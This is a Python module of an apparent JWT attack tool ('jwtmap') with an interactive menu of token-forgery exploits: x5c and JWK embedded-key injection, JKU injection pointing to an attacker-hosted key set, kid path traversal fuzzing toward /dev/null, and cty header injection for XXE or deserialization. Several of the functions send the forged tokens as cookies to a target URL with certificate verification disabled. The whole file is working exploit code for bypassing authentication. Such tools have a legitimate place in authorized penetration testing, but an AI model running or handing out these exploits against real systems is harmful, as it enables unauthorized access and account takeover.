import sys
import os
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from helpers import *

def run_x5c_injection():
    print(f"\n{PURPLE}--- X.509 CERTIFICATE CHAIN (x5c) INJECTION ---{RESET}")
    token = input(f"{YELLOW}[?] Enter Original JWT: {RESET}").strip()
    target_url = input(f"{YELLOW}[?] Enter Target URL: {RESET}").strip()
    cookie_name = input(f"{YELLOW}[?] Enter Cookie Name: {RESET}").strip()

    parts = token.split('.')
    if len(parts) < 2:
        print(f"{RED}[!] Invalid JWT format.{RESET}")
        return

    try:
        # Generate RSA Key Pair
        priv_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
        public_key = priv_key.public_key()

        # Generate Self-Signed Certificate
        subject = issuer = x509.Name([
            x509.NameAttribute(NameOID.COMMON_NAME, u"attacker.example.com"),
        ])

        cert = x509.CertificateBuilder().subject_name(subject)\
            .issuer_name(issuer)\
            .public_key(public_key)\
            .serial_number(x509.random_serial_number())\
            .not_valid_before(datetime.datetime.utcnow())\
            .not_valid_after(datetime.datetime.utcnow() + datetime.timedelta(days=1))\
            .sign(priv_key, hashes.SHA256())

        # DER → standard base64
        cert_der = cert.public_bytes(serialization.Encoding.DER)
        cert_b64 = base64.b64encode(cert_der).decode('ascii')

        # Prepare Header
        header_raw = parts[0] + "=" * ((4 - len(parts[0]) % 4) % 4)
        header = json.loads(b64_d(header_raw))   # reuse your helper

        header.update({
            "alg": "RS256",
            "x5c": [cert_b64]          # array of base64 DER certs
        })

        # Modify Payload
        payload_raw = parts[1] + "=" * ((4 - len(parts[1]) % 4) % 4)
        print(f"{CYAN}[*] Current Payload: {RESET}{b64_d(payload_raw).decode(errors='replace')}")
        
        while True:
            new_p_input = input(f"{YELLOW}[?] Enter NEW Payload (JSON): {RESET}").strip()
            try:
                new_p_json = json.loads(new_p_input)
                break
            except json.JSONDecodeError as e:
                print(f"{RED}[!] Invalid JSON: {e}{RESET}")

        # Forge Token
        encoded_h = b64_e(json.dumps(header, separators=(',', ':')))
        encoded_p = b64_e(json.dumps(new_p_json, separators=(',', ':')))

        signing_input = f"{encoded_h}.{encoded_p}".encode()
        sig = priv_key.sign(signing_input, padding.PKCS1v15(), hashes.SHA256())

        exploit = f"{encoded_h}.{encoded_p}.{b64_e(sig)}"

        print(f"\n{GREEN}[+] Crafted x5c exploit token:{RESET}")
        print(f"{RED}{exploit}{RESET}")

        # Optional Live Test
        test = input(f"\n{YELLOW}[?] Send to target now? (Y/N): {RESET}").strip().upper()
        if test in ['Y', 'YES', '']:
            print(f"{CYAN}[*] Sending exploit...{RESET}")
            resp = requests.get(target_url, cookies={cookie_name: exploit}, verify=False, allow_redirects=False, timeout=10)
            print(f"{CYAN}[*] Status Code: {resp.status_code}{RESET}")
            if resp.status_code == 200:
                print(f"{GREEN}[+] Likely SUCCESS!{RESET}")
            else:
                print(f"{YELLOW}[-] Status: {resp.status_code} (may still have worked depending on app){RESET}")

    except Exception as e:
        print(f"{RED}[!] Error: {e}{RESET}")

    input(f"\n{CYAN}[>] Press Enter to return...{RESET}")

def run_jwk_injection():
    print(f"\n{PURPLE}--- JWK (JSON WEB KEY) HEADER INJECTION ---{RESET}")
    token = input(f"{YELLOW}[?] Enter Original JWT: {RESET}").strip()
    parts = token.split('.')
    if len(parts) < 2:
        print(f"{RED}[!] Error: Invalid JWT format.{RESET}")
        return

    try:
        # 1. Generate Malicious RSA Key & JWK Header
        print(f"{CYAN}[*] Generating malicious RSA key pair...{RESET}")
        priv, jwk = generate_rsa_jwk()
        
        # 2. Extract and Update Header
        header = json.loads(b64_d(parts[0]))
        header.update({
            "alg": "RS256", 
            "jwk": jwk, 
            "kid": jwk.get('kid', 'jwtmap-key')
        })
        
        # 3. Handle Payload Forgery
        print(f"{CYAN}[*] Original Payload: {RESET}{b64_d(parts[1]).decode()}")
        while True:
            new_p_input = input(f"{YELLOW}[?] Enter NEW JSON Payload: {RESET}").strip()
            try:
                new_p_json = json.loads(new_p_input)
                break
            except json.JSONDecodeError as e:
                print(f"{RED}[!] Invalid JSON. Try again.{RESET}")

        # 4. Sign and Forge Token
        encoded_h = b64_e(json.dumps(header, separators=(',', ':')))
        encoded_p = b64_e(json.dumps(new_p_json, separators=(',', ':')))
        
        print(f"{CYAN}[*] Signing forged token with malicious private key...{RESET}")
        signing_input = f"{encoded_h}.{encoded_p}".encode()
        sig = priv.sign(
            signing_input, 
            padding.PKCS1v15(), 
            hashes.SHA256()
        )
        
        exploit_token = f"{encoded_h}.{encoded_p}.{b64_e(sig)}"
        print(f"\n{GREEN}[+] FORGED JWK INJECTION TOKEN:{RESET}\n{RED}{exploit_token}{RESET}")

        # 5. Optional Target Testing 
        choice = input(f"\n{YELLOW}[?] Do you want to test this on a URL? (Y/N): {RESET}").strip().upper()
        if choice in ['Y', 'YES', '']:
            target_url = input(f"{YELLOW}[?] Enter Target URL: {RESET}").strip()
            cookie_name = input(f"{YELLOW}[?] Enter Cookie Name: {RESET}").strip()
            
            print(f"{CYAN}[*] Sending Exploit...{RESET}")
            try:
                resp = requests.get(
                    target_url, 
                    cookies={cookie_name: exploit_token}, 
                    verify=False, 
                    allow_redirects=False,
                    timeout=10
                )
                print(f"{CYAN}[*] Status Code: {RESET}{resp.status_code}")
                print(f"{CYAN}[*] Response Length: {RESET}{len(resp.content)}")
                
                if resp.status_code == 200:
                    print(f"{GREEN}[+] Likely SUCCESS! Check the application response.{RESET}")
                else:
                    print(f"{YELLOW}[!] Request sent. Review status code for bypass confirmation.{RESET}")
            except Exception as req_e:
                print(f"{RED}[!] Connection Error: {req_e}{RESET}")

    except Exception as e:
        print(f"{RED}[!] Error: {e}{RESET}")

    input(f"\n{CYAN}[>] Press Enter to return to menu...{RESET}")


def run_jku_injection():
    print(f"\n{PURPLE}--- JKU (JWK SET URL) HEADER INJECTION ---{RESET}")
    token = input(f"{YELLOW}[?] Enter Original JWT: {RESET}").strip()
    parts = token.split('.')
    if len(parts) < 2: return

    try:
        # Step 1: Generate keys
        priv, jwk = generate_rsa_jwk()
        print(f"\n{CYAN}[*] Host this JSON on your exploit server:{RESET}")
        jwks_format = {"keys": [jwk]}
        print(f"{GREEN}{json.dumps(jwks_format, indent=4)}{RESET}")
        
        jku_url = input(f"\n{YELLOW}[?] Enter the Public URL where you hosted it: {RESET}").strip()
        
        # Step 2: Forge the Header & Payload
        header = json.loads(b64_d(parts[0]))
        header.update({"alg": "RS256", "jku": jku_url, "kid": jwk['kid']})
        
        print(f"{CYAN}[*] Original Payload: {RESET}{b64_d(parts[1]).decode()}")
        while True:
            new_p_input = input(f"{YELLOW}[?] Enter NEW JSON Payload: {RESET}").strip()
            try:
                new_p_json = json.loads(new_p_input)
                break
            except json.JSONDecodeError:
                print(f"{RED}[!] Invalid JSON. Try again.{RESET}")

        # Step 3: Sign the token
        encoded_h = b64_e(json.dumps(header, separators=(',', ':')))
        encoded_p = b64_e(json.dumps(new_p_json, separators=(',', ':')))
        sig = priv.sign(f"{encoded_h}.{encoded_p}".encode(), padding.PKCS1v15(), hashes.SHA256())
        exploit_token = f"{encoded_h}.{encoded_p}.{b64_e(sig)}"

        print(f"\n{GREEN}[+] FORGED JKU TOKEN:{RESET}\n{RED}{exploit_token}{RESET}")

        # Step 4: Optional Test
        choice = input(f"\n{YELLOW}[?] Test this on a URL? (Y/N): {RESET}").strip().upper()
        if choice in ['Y', 'YES', '']:
            target_url = input(f"{YELLOW}[?] Target URL: {RESET}").strip()
            cookie_name = input(f"{YELLOW}[?] Cookie Name: {RESET}").strip()
            resp = requests.get(target_url, cookies={cookie_name: exploit_token}, verify=False, allow_redirects=False)
            print(f"{CYAN}[*] Status: {resp.status_code}{RESET}")
            if resp.status_code == 200: print(f"{GREEN}[+] SUCCESS!{RESET}")

    except Exception as e:
        print(f"{RED}[!] Error: {e}{RESET}")
    input(f"\n{CYAN}[>] Press Enter to return to menu...{RESET}")

def run_kid_traversal():
    print(f"\n{PURPLE}--- KID PATH TRAVERSAL (Fuzzer) ---{RESET}")
    token = input(f"{YELLOW}[?] Enter Original JWT: {RESET}").strip()
    parts = token.split('.')
    if len(parts) < 2: return

    try:
        header = json.loads(b64_d(parts[0]))
        header['alg'] = 'HS256' 
        
        print(f"{CYAN}[*] Original Payload: {RESET}{b64_d(parts[1]).decode()}")
        while True:
            new_p_input = input(f"{YELLOW}[?] Enter NEW JSON Payload: {RESET}").strip()
            try:
                new_p_json = json.loads(new_p_input)
                break
            except json.JSONDecodeError:
                print(f"{RED}[!] Invalid JSON. Try again.{RESET}")

        target_url = input(f"{YELLOW}[?] Enter Target URL for Fuzzing: {RESET}").strip()
        cookie_name = input(f"{YELLOW}[?] Enter Cookie Name: {RESET}").strip()
        
        print(f"\n{CYAN}[*] Fuzzing traversal depth (Target: /dev/null)...{RESET}")
        secret = b'\x00'
        found = False
        
        for i in range(1, 15): 
            traversal_path = "../" * i + "dev/null"
            header['kid'] = traversal_path
            
            encoded_h = b64_e(json.dumps(header, separators=(',', ':')))
            encoded_p = b64_e(json.dumps(new_p_json, separators=(',', ':')))
            
            signing_input = f"{encoded_h}.{encoded_p}".encode()
            sig = hmac.new(secret, signing_input, hashlib.sha256).digest()
            exploit = f"{encoded_h}.{encoded_p}.{b64_e(sig)}"
            
            print(f"    {YELLOW}[~] Testing depth {i}...{RESET}", end="\r")
            resp = requests.get(target_url, cookies={cookie_name: exploit}, verify=False, allow_redirects=False)
            
            if resp.status_code == 200:
                print(f"\n{GREEN}[+] SUCCESS AT DEPTH {i}!{RESET}")
                print(f"{RED}{exploit}{RESET}")
                found = True
                break
        
        if not found: print(f"\n{RED}[-] Failed to find a valid depth.{RESET}")

    except Exception as e:
        print(f"{RED}[!] Error: {e}{RESET}")
    input(f"\n{CYAN}[>] Press Enter to return to menu...{RESET}")

def run_cty_injection():
    print(f"\n{PURPLE}--- CTY (CONTENT-TYPE) HEADER INJECTION ---{RESET}")
    token = input(f"\n{YELLOW}[?] Enter Current JWT (with valid signature): {RESET}").strip()
    parts = token.split('.')
    if len(parts) < 3: return
    try:
        header_raw = parts[0]
        header_raw += "=" * ((4 - len(header_raw) % 4) % 4)
        header = json.loads(base64.urlsafe_b64decode(header_raw).decode())
        print(f"\n{CYAN}[*] Select Content-Type strategy:{RESET}")
        print("1. text/xml (For XXE)")
        print("2. application/x-java-serialized-object (For Deserialization)")
        print("3. Custom String")
        choice = input(f"{YELLOW}jwtmap/cty > {RESET}").strip()
        if choice == '1':
            header['cty'] = 'xml'
        elif choice == '2':
            header['cty'] = 'application/x-java-serialized-object'
        else:
            header['cty'] = input(f"{YELLOW}[?] Enter Custom CTY value: {RESET}").strip()
        new_payload = input(f"\n{YELLOW}[?] Enter the ATTACK PAYLOAD: {RESET}").strip()
        encoded_h = b64_e(json.dumps(header, separators=(',', ':')))
        encoded_p = b64_e(new_payload)
        exploit_token = f"{encoded_h}.{encoded_p}.{parts[2]}"
        print(f"\n{GREEN}[+] CTY EXPLOIT TOKEN GENERATED:{RESET}")
        print(f"{RED}{exploit_token}{RESET}")
    except Exception as e:
        print(f"{RED}[!] Error: {e}{RESET}")
    input(f"\n{CYAN}[>] Press Enter to return...{RESET}")

def jose_menu():
    while True:
        print(f"\n{PURPLE}--- JOSE & EXPERT ATTACK MENU ---{RESET}")
        print("1. JWK Injection (Embedded Key)")
        print("2. JKU Injection (URL-based Key)")
        print("3. KID Path Traversal Attack")
        print("4. Content-Type Injection (XXE/Deserialization)")
        print("5. X.509 CERTIFICATE CHAIN (x5c) INJECTION")
        print("6. Back to Main Menu")
        
        choice = input(f"\n{CYAN}jwtmap/jose > {RESET}").strip()
        if choice == '1': run_jwk_injection()
        elif choice == '2': run_jku_injection()
        elif choice == '3': run_kid_traversal()
        elif choice == '4': run_cty_injection()
        elif choice == '5': run_x5c_injection()
        elif choice == '6': break